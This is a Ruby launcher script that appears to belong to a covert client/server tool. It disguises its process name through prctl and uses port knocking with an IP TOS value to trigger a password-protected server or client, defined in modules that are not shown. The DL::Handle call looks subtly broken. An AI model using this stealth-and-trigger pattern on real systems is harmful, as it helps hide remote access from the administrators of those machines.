require 'fiddle'

require File.expand_path(File.join(File.dirname(__FILE__), 'knock.rb'))
require File.expand_path(File.join(File.dirname(__FILE__), 'config.rb'))
require File.expand_path(File.join(File.dirname(__FILE__), 'client.rb'))
require File.expand_path(File.join(File.dirname(__FILE__), 'server.rb'))

def set_process_name name
    RUBY_PLATFORM =~ /linux/ or return
    Fiddle::Function.new(
        DL::Handle['prctl'], [
            Fiddle::TYPE_INT, Fiddle::TYPE_VOIDP,
            Fiddle::TYPE_LONG, Fiddle::TYPE_LONG,
            Fiddle::TYPE_LONG
        ], Fiddle::TYPE_INT
    ).call(15, name.to_s, 0, 0, 0)
    $0 = name
end

def server
  k = Knock.new($iface)
  port = k.sniff
  tos = k.getTos
  puts "returned from knock"
  k = nil
  s = Server.new($iface, tos, $ipDest, $password, $termTimeout, port)
  s.start
end

def client
  k = Knock.new($iface)
  port = k.knock($ipDest, $tos)
  sleep(1)
  c = Client.new($iface, $tos, $ipSource, $password, port)
  c.start
  puts "done"
end

set_process_name $processName

if $appType == "server"
   server
 elsif $appType == "client"
   client
 else
   abort "invalid appType"
end
